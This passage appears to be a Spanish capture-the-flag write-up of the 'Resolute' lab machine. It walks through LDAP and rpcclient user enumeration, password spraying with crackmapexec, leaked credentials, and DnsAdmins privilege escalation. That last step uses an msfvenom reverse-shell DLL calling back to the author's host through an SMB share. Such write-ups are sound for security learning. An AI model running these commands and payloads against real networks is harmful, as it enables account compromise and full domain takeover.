+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_scriptPY_connectLDAP_arrayUsers.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ahora nos queda jugar con ese array y generar infinidad de usuarios.</p>
+
+<p>▶️ <strong><em><a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-es.md">Lindo tutorial de expresiones regulares</a></em></strong>.</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Con ayuda de la librería <code>ldap3</code> en <strong>Python</strong> y nuestra extracción de usuarios podemos crear un bucle primero para quitar <code>cn:</code> de cada usuario y segundo para armar el formato que queramos con respecto a cada user, este sería el resultado final de nuestro script:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import ldap3
+import re
+
+server = ldap3.Server('10.10.10.169', get_info = ldap3.ALL, port = 389, use_ssl = False)
+connection = ldap3.Connection(server)
+connection.bind()
+
+connection.search(search_base='DC=megabank,DC=local', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='CN')
+
+users_array = re.findall(r'cn: [A-Za-z0-9\s].+', str(connection.entries))
+
+# Creamos archivo vacio llamado `users.txt`
+file_users = open("users.txt", "w")
+for user_with_cn in users_array:
+    user = user_with_cn.replace("cn: ","")
+
+    # Ejemplo: Ryan Bertrand
+    try:
+        # Ryan
+        firstname = user.split()[0]
+        # Bertrand
+        lastname = user.split()[1]
+
+        # -- Abrimos archivo para adjuntar data, no para sobreescribirla
+        file_users = open("users.txt", "a")
+
+        # Ryan
+        file_users.write(firstname + "\n")
+        # ryan.bertrand
+        file_users.write(firstname.lower() + "." + lastname.lower() + "\n")
+        # Ryan.Bertrand
+        file_users.write(firstname + "." + lastname + "\n")
+        # Ryan@Bertrand
+        file_users.write(firstname + "@" + lastname + "\n")
+        # RyanBertrand
+        file_users.write(firstname + lastname + "\n")
+        # R.bertrand
+        file_users.write(firstname[0] + "." + lastname.lower() + "\n")
+        # Rbertrand
+        file_users.write(firstname[0] + lastname.lower() + "\n")
+        # r.bertrand
+        file_users.write(firstname.lower()[0] + "." + lastname.lower() + "\n")
+        # rbertrand
+        file_users.write(firstname.lower()[0] + lastname.lower() + "\n")
+
+    except:
+        pass
+
+file_users.close()
+</code></pre>
+
+<p>Y en nuestro archivo <code>users.txt</code> veríamos algo así con todos los usuarios:</p>
+
+<pre><code class="language-bash">❱ cat users.txt
+...
+Marcus
+marcus.strong
+Marcus.Strong
+Marcus@Strong
+MarcusStrong
+M.strong
+Mstrong
+m.strong
+mstrong
+...
+</code></pre>
+
+<p>Perfectísimo, tendríamos varias opciones de usuarios, solo nos faltaría la contraseña, podemos probar varias cosas, inicialmente algo como que cada <strong>usuario</strong> tome su “user” como contraseña (no se sabe, la vida es muy loca :P):</p>
+
+<p>Nos apoyaremos en <code>crackmapexec</code> que puede validar rápidamente contra <strong>SMB</strong> si unas credenciales son válidas o no:</p>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.169 -u users.txt -p users.txt
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Ryan STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:ryan.bertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Ryan.Bertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Ryan@Bertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:RyanBertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:R.bertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Rbertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:r.bertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:rbertrand STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:Marko STATUS_LOGON_FAILURE
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Ryan:marko.novak STATUS_LOGON_FAILURE
+...
+</code></pre>
+
+<p>Pero nada, ninguna es valida 😔</p>
+
+<hr />
+
+<h2 id="rpcclient-dc">Enumeramos con <u>rpcclient</u> el <u>Domain Controller</u> <a href="#rpcclient-dc">📌</a></h2>
+
+<p>Después de agotar pruebas volvi al escaneo de puertos y recordé a <code>rpcclient</code>, herramienta que nos ayuda a rescatar más info del controlador de dominio (en caso de no necesitar credenciales 🙃), su uso es sencillo:</p>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N
+rpcclient $&gt;
+</code></pre>
+
+<p>Perfecto, nos dejó entrar sin credenciales, ahora es ver si hay algo para enumerar…</p>
+
+<p>Intentando ver los usuarios del dominio obtenemos info, lo único que cambia con respecto a los que tenemos son los primeros:</p>
+
+<pre><code class="language-bash">rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+...
+</code></pre>
+
+<p>Si nos fijamos también nos muestra un campo llamado <code>rid</code> que seria como un identificador para ese usuario, este nos sirve entre varias cosas para listar más info acerca del user, como por ejemplo con <code>Administrator</code>:</p>
+
+<pre><code class="language-bash">rpcclient $&gt; queryuser 0x1f4
+        User Name   :   Administrator
+        Full Name   :
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :   Built-in account for administering the computer/domain
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      mié, 11 ago 2021 11:09:43 -05
+        Logoff Time              :      mié, 31 dic 1969 19:00:00 -05
+        Kickoff Time             :      mié, 31 dic 1969 19:00:00 -05
+        Password last set Time   :      jue, 12 ago 2021 09:46:03 -05
+        Password can change Time :      vie, 13 ago 2021 09:46:03 -05
+        Password must change Time:      mié, 13 sep 30828 21:48:05 -05
+        unknown_2[0..31]...
+        user_rid :      0x1f4
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000003e
+        padding1[0..7]...
+        logon_hrs[0..21]...
+</code></pre>
+
+<p>Obtenemos eso, una información más detallada del usuario, podríamos hacer a mano esto con todos los demás usuarios, pero es un poco feo, lo mejor es automatizarlo, hagámoslo rápidamente con ayuda de la terminal, lo primero es extraer todos los <code>rids</code>:</p>
+
+<p>Con el parámetro <code>-c</code> le indicamos que ejecute un comando y no nos devuelva una sesión interactiva:</p>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers'
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+...
+</code></pre>
+
+<p>Ahora filtramos por el <code>rid</code>:</p>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers' | grep -oP "rid.+"
+rid:[0x1f4]
+rid:[0x1f5]
+...
+</code></pre>
+
+<p>Separamos la cadena en dos delimitndola por el simbolo <code>:</code> y nos quedamos con el segundo valor:</p>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers' | grep -oP "rid.+" | cut -d ':' -f 2
+[0x1f4]
+[0x1f5]
+...
+</code></pre>
+
+<p>Y simplemente quitamos los <code>[]</code> de la cadena:</p>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N -c 'enumdomusers' | grep -oP "rid.+" | cut -d ':' -f 2 | tr -d '[]'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_rpcclientGREP_rids.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones, al final le agregamos un archivo donde queremos guardar esos valores (<code>... &gt; rids.txt</code>) y ya tenemos los <code>rids</code> (:</p>
+
+<p>Ahora volvemos a usar <code>rpcclient</code>, pero con el comando <code>queryuser</code> y le vamos pasando los <code>rids</code> del archivo, primero hagamos una prueba con el usuario <code>Administrator</code>, ya vimos todos los campos que nos devuelve al ejecutar el comando, quedémonos con el nombre del usuario y su descripción, ningún otro campo se ve llamativo así que juguemos con esos dos:</p>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N -c 'queryuser 0x1f4' -N | grep -E "User Name|Description"
+        User Name   :   Administrator
+        Description :   Built-in account for administering the computer/domain
+</code></pre>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N -c 'queryuser 0x1f4' -N | grep -E "User Name|Description" | cut -d ":" -f2-
+        Administrator
+        Built-in account for administering the computer/domain
+</code></pre>
+
+<pre><code class="language-bash">❱ rpcclient 10.10.10.169 -U "" -N -c 'queryuser 0x1f4' -N | grep -E "User Name|Description" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//'
+Administrator
+Built-in account for administering the computer/domain
+</code></pre>
+
+<p>Listo, ya tenemos nuestro output deseado, juguemos con un bucle que lea cada línea del archivo y realice el mismo procedimiento pero con todos los usuarios:</p>
+
+<pre><code class="language-bash">❱ for i in $(cat rids.txt); do echo "-----------"; rpcclient 10.10.10.169 -U "" -N -c "queryuser $i" -N | grep -E "User Name|Description" | cut -d ":" -f2- | sed -e 's/^[[:space:]]*//'; done
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_forloop_rpcclient_foundPW.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>¿Ya viste algo? 😵 Efectivamente, hay una contraseña seteada para el usuario <code>marko</code> :O :o O.O Puuuuuuuuuuuess probando de nuevo con <code>cme</code>, pero ahora contra “<code>marko</code>” no nos dan resultado esas credenciales :(</p>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.169 -u 'marko' -p 'Welcome123!'
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
+</code></pre>
+
+<p>Probando contra los demás servicios no es válida tampoco :( peeeeeeeeeeero no nos rendimos, si recordamos habíamos creado una lista de usuarios muy linda, pues volvamos a probar con cada usuario del objeto pero ahora contra esa contraseña:</p>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_cme_MelaniePWvalid.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OPAAAAAAAAAAAAAAAAAAAAA, <code>crackmapexec</code> nos indica que esa contraseña es válida contra el usuario <code>Melanie</code>.</p>
+
+<p>Recordemos que existe el servicio <code>WinRM</code> (que nos permite jugar con tareas administrativas) y para él hay una herramienta muy linda llamada <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>, ella nos permite obtener una <strong>PowerShell</strong> en el sistema siempre y cuando tengamos credenciales válidas, intentemos usarla:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_evilWinRM_melanieSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>VAMOOOOOOOOOOOOO, tamos dentroooooooooooowowowowoiqwjrasdkfjkalñd</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_patricioOH.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;" /></p>
+
+<p>s1g4m0s…</p>
+
+<p>…</p>
+
+<h1 id="creds-pstranscript">Movimiento lateral : Melanie -&gt; Ryan <a href="#creds-pstranscript">#</a></h1>
+
+<p>Recorriendo algunas carpetas del sistema vemos una oculta en la raíz: <code>PSTranscripts</code>:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; ls -force
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+...
+d--h--        12/3/2019   6:32 AM                PSTranscripts
+...
+</code></pre>
+
+<p>Su nombre es llamativo, ya que habla de scripts, entremos y veamos que hay:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\PSTranscripts&gt; ls -force -recurse
+
+    Directory: C:\PSTranscripts
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--h--        12/3/2019   6:45 AM                20191203
+
+    Directory: C:\PSTranscripts\20191203
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+</code></pre>
+
+<p>Un directorio <code>20191203</code> y dentro un objeto <code>.txt</code>, veamos ese archivo:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+...
+...
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Invoke-Expression): "Invoke-Expression"
+&gt;&gt; ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4c123!
+...
+...
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Out-String): "Out-String"
+&gt;&gt; ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4c123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
++ FullyQualifiedErrorId : NativeCommandError
+...
+...
+**********************
+Windows PowerShell transcript start
+...
+...
+</code></pre>
+
+<p>Es un archivo que uso <code>Ryan</code> para registrar todo lo que escribía mientras efectuaba el mapeado del directorio <code>\\fs01\backups</code> en <code>X:</code>, hay dos cosas interesantes, que escribió mal el comando (aunque lo hubiera ejecutado bien también tendríamos lo otro curioso 😏) y que uso sus credenciales así como si nada y pues nos dejó un historial to lindo.</p>
+
+<ul>
+  <li><a href="https://www.eltallerdesharepoint.com/net/registrar-a-fichero-de-log-la-linea-de-comandos-de-powershell-transcript-en-powershell/">Registrar a fichero de log la línea de comandos de PowerShell (Transcript en PowerShell)</a>.</li>
+</ul>
+
+<p>Sabemos que <code>Ryan</code> es un usuario del `AD, pero no si también existe en el sistema, validemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_melanieSH_dirUsers_RYANfound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones, si existe, entonces probemos a obtener una nueva <strong>PowerShell</strong> pero ahora como él:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_evilWinRM_ryanSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OJITO, tamos dentro del sistema pero ahora como el usuario <code>Ryan</code> (:</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>En su escritorio hay una nota:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\\Users\ryan\Desktop&gt; type note.txt
+Email to team:
+
+- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+</code></pre>
+
+<p>Jmmmm… Podemos interpretarlo como un ¿backup?, que da igual si cambiamos algo, ¿en un minuto volverá a quedar como antes? Investiguemos…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_computerANDfireALLfine.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>Después de un tiempo perdido, volví atrás y con un simple comando ya nos encaminamos:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; whoami /all
+...
+...
+GROUP INFORMATION
+-----------------
+
+Group Name             Type    SID                                            Attributes
+====================== ======= ============================================== ===============================================================
+...
+MEGABANK\Contractors   Group   S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins     Alias   S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+...
+</code></pre>
+
+<p>Vemos que estamos en dos grupos distintos a los normales, uno de ellos con un nombre llamativo: <code>DnsAdmins</code>, si buscamos info sobre él en internet lo primero que encontramos son formas de escalar privilegios usándolo 😮</p>
+
+<ul>
+  <li><a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">Feature, not bug: DNSAdmin to DC compromise in one line</a>.</li>
+  <li><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">DNS Admin Privesc in Active Directory (AD)(Windows)</a>.</li>
+  <li><a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/">Windows Privilege Escalation: DnsAdmins to DomainAdmin</a>.</li>
+  <li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">From DnsAdmins to SYSTEM to Domain Compromise</a>.</li>
+</ul>
+
+<p>Antes de explotar esta locura, recorramos un poco el “porque” del ataque…</p>
+
+<p>Según <a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83">Shay Ber</a> por default los controladores de dominio (DC) también son servidores <strong>DNS</strong>, el tema es que eso expone al <strong>DC</strong> a ataques relacionados con servidores <strong>DNS</strong> :O</p>
+
+<p>Únicamente los usuarios que estén en los grupos <strong><em>DnsAdmins, Domain Admins, Enterprise Admins, Administrators and ENTERPRISE DOMAIN CONTROLLERS</em></strong> tienen acceso al control/mantenimiento/gestion/actualización de un servidor <strong>DNS</strong> (que como dijimos antes, usualmente son <strong>DC</strong>s). Una vez dentro se pueden administrar zonas del <strong>DNS</strong>, redireccionamiento de puertos, logs, temas de la caché, objetos del servidor y de registros (etc.). Este último es interesante, ya que podemos escribir información adicional en el servidor <strong>DNS</strong> (:</p>
+
+<p>Listones, nosotros estamos en uno de esos grupos, específicamente en <code>DnsAdmins</code>. Entonces para lograr la explotación debemos, cargar una <strong>DLL</strong> (librería dinámica) maliciosa en el servidor <strong>DNS</strong> (que esta siendo ejecutado como <strong>SYSTEM, ya que por lo general el servidor es un **DC</strong>).</p>
+
+<p>💌 <strong><em>“Las <code>DLL (Dynamic Link Library)</code>, son fragmentos de código que se cargan bajo demanda por parte del sistema operativo durante la ejecución de una aplicación.”</em></strong> <a href="https://www.elladodelmal.com/2020/07/dll-injection-como-hacer-hacking-en.html">elladodelmal</a>.</p>
+
+<p>O sea, librerías que tiene por default (o no 😈) el sistema y son necesarias para ejecutar una aplicación.</p>
+
+<p>En términos generales hay dos maneras de generar la <strong><em>DLL maliciosa</em></strong>, una es con ayuda de <code>msfvenom</code> y la otra es construir nosotros mismos las instrucciones de la <strong>DLL</strong>, vamos a hacerlo de las dos maneras, pero dejaremos la creación manual de la <strong>DLL</strong> como aprendizaje para el final…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_computertrash.gif" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Así que juguemos con <code>msfvenom</code>…</p>
+
+<p>…</p>
+
+<p>Los pasos necesarios para la explotación son estos (siguiendo <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">este</a> y <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">este post</a>):</p>
+
+<p><span style="color: yellow;">1. </span>Generamos la <strong>DLL</strong> maliciosa con <code>msfvenom</code>:</p>
+
+<pre><code class="language-bash">❱ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4433 -f dll -o sisisi.dll
+❱ file sisisi.dll 
+sisisi.dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
+</code></pre>
+
+<p><span style="color: yellow;">2. </span>Nos ponemos en escucha por <strong>netcat</strong> (para recibir la petición que hace la DLL y generar la Shell):</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p><span style="color: yellow;">3. </span>Compartimos una carpeta donde esté la DLL generada, esto con ayuda de <strong>SMB</strong> (o <strong>responder</strong>):</p>
+
+<pre><code class="language-bash">❱ smbserver.py smbFolder $(pwd) -smb2support
+</code></pre>
+
+<p>La carpeta se llama <code>smbFolder</code>, le pasamos la ruta actual (el resultado del comando <code>pwd</code>) y le damos soporte a la versión 2 de samba.</p>
+
+<p><span style="color: yellow;">4. </span>Ahora agregamos la <strong>DLL</strong> al servicio <strong>DNS</strong>:</p>
+
+<p>Validamos antes como esta el registro (se acuerdan lo que hablamos antes de que podíamos escribir cositas, entre ellas registros :P) que modificaremos:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+Property ServerLevelPluginDll does not exist at path HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\.
+...
+</code></pre>
+
+<p>Exacto, aún no lo hemos creado :P</p>
+
+<p>Lo creamos diciendo que la <strong>DLL</strong> a agregar esta siendo compartida en una carpeta de <strong>SMB</strong>:</p>
+
+<p>(<em>También podríamos subir la <strong>DLL</strong> al sistema y en vez de la carpeta compartida pasarle la ruta absoluta hacia ella</em>)</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; dnscmd /config /serverlevelplugindll \\10.10.14.8\smbFolder\sisisi.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+</code></pre>
+
+<p>Y si ahora validamos la existencia del registro:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ryanSH_registryDNSexists.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ya existe, peeeeerfectisimo.</p>
+
+<p>Como último paso debemos “reiniciar” el servicio <strong>DNS</strong> para que tome los cambios. Ejecutara el servidor <strong>DNS</strong>, leerá los registros relacionados, tomara el que llama la <strong>DLL</strong> y por lo tanto la ejecutara (:</p>
+
+<p><span style="color: yellow;">5. </span>Reiniciamos el servidor <strong>DNS</strong> para que ejecute nuestra <strong>DLL</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ryanSH_StopStartDNS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Una vez iniciamos el servidor <strong>DNS</strong> nos llega la petición a nuestra carpeta compartida buscando la <strong>DLL</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_smbserver_requestsDLL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si esperamos un rato pensaremos que no funciono, peeeeeeeero esperamos un ratico más yyyyyyyyyyy…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_SYSTEMrevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>PERO CLARO QUE SIIIIIIIII, obtenemos nuestra <strong>Reverse Shell</strong> como el usuario <code>nt authority\system</code> (diosito) del sistema (: veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y listos, eso ha sido todo por esta máquina ✈️ Si quieres ver como generar la <strong>DLL</strong> manualmente sigue conmigo e.e</p>
+
+<p>…</p>
+
+<h1 id="manual-dll">Post-PrivEsc: Creamos <u>DLL</u> manualmente <a href="#manual-dll">#</a></h1>
+
+<p>Buscando en internet <code>example dll dns github</code> encontramos 2 llamativos:</p>
+
+<ol>
+  <li><a href="https://github.com/dim0x69/dns-exe-persistance">https://github.com/dim0x69/dns-exe-persistance</a>.</li>
+  <li><a href="https://github.com/kazkansouh/DNSAdmin-DLL">https://github.com/kazkansouh/DNSAdmin-DLL</a>.</li>
+</ol>
+
+<p>Usaremos los dos para lograr la ejecución de comandos:</p>
+
+<p>🅰 <a href="#repo-dns-exe-persistance">Escalada generando <strong>DLL</strong> con <strong>dns-exe-persistance</strong></a>.<br />
+🅱️ <a href="#repo-dnsadmin-dll">Escalada generando <strong>DLL</strong> con <strong>DNSAdmin-DLL</strong></a>.</p>
+
+<p>…</p>
+
+<h2 id="repo-dns-exe-persistance">Generamos la <u>DLL</u> usando <u>dns-exe-persistance</u> <a href="#repo-dns-exe-persistance">📌</a></h2>
+
+<p>▶️ <a href="https://github.com/dim0x69/dns-exe-persistance">https://github.com/dim0x69/dns-exe-persistance</a>.</p>
+
+<p>Revisando los post que hemos usado vemos que el siguiente tiene una estructura prácticamente igual al objeto <code>Win32Project1.cpp</code> del <strong>primer recurso</strong>, por lo que podemos pensar que o lo hizo él o se guio de ahí (o viceversa, el del repo se guio del post, no lo sabemos):</p>
+
+<ul>
+  <li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">From DnsAdmins to SYSTEM to Domain Compromise</a>.</li>
+</ul>
+
+<p>Nos centraremos en el <strong>primer recurso</strong>, después será más rápido usar el <strong>segundo</strong>…</p>
+
+<p>La estructura base del <code>DLL</code> (creo que de cualquier DLL) es esta (exactamente igual en los dos proyectos de arriba):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_git_structureDLL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, la parte que nos interesa (y con la que juega el creador del post) es la que esta en al archivo <code>Win32Project1.cpp</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_git_structureDLL_PluginDNS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si nos fijamos la primera función se llama <code>DnsPluginInitialize</code>, lo que nos puede indicar que eso es lo que se ejecutara una vez el plugin sea iniciado, por lo queeeeeee ahí debe ir nuestra matralla. El post con el que venimos trabajando y <a href="https://vbscrub.com/2020/01/11/dns-server-plugin-dll-implementation-dnsplugininitialize-etc/">este</a> nos lo confirman.</p>
+
+<p>Listooos, apoyados de nuevo en el post vemos que implementa en esa función la instrucción <code>system()</code> para que le ejecute el binario <code>shell.cmd</code> de la raíz (que puede contener ya sea una reverse shell o lo que sea).</p>
+
+<p>Pues aprovechemos ese conocimiento para implementar en el archivo <code>Win32Project1.cpp</code> una línea con la función <code>system()</code>, pero como prueba que nos haga un <code>ping</code> hacia nuestra máquina, con lo cual si obtenemos la traza, sabemos que estamos ejecutando comandos en el sistema por medio de la <code>DLL</code>.</p>
+
+<p>Nos movemos a una VM <strong>Windows</strong>, clonamos el repo, abrimos el objeto <code>Win32Project1.sln</code> (usaré <a href="https://visualstudio.microsoft.com/es/">Visual Studio</a> para abrir el proyecto, modificarlo y compilarlo) y nos posicionamos en el archivo <code>Win32Project1.cpp</code>.</p>
+
+<p>Ahora agregamos la línea con la instrucción <code>system()</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220win_VS_win32projCPP_systemPING.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Lo siguiente será compilar el proyecto para que nos genere el archivo <code>.dll</code>.</p>
+
+<p>Arriba cambiamos <code>Debug</code> por <code>Release</code>, le decimos que la arquitectura es de <code>64 bits</code> y finalmente damos clic en <code>Compilar</code> y <code>Recompilar solución</code>:</p>
+
+<pre><code class="language-c++">1&gt;Generando código
+1&gt;0 of 4 functions ( 0.0%) were compiled, the rest were copied from previous compilation.
+1&gt;  0 functions were new in current compilation
+1&gt;  0 functions had inline decision re-evaluated but remain unchanged
+1&gt;Generación de código finalizada
+1&gt;Win32Project1.vcxproj -&gt; C:\dns-exe-persistance\dns-plugindll-vcpp\x64\Release\Win32Project1.dll
+========== Compilar: 1 correctos, 0 incorrectos, 0 actualizados, 0 omitidos ==========
+</code></pre>
+
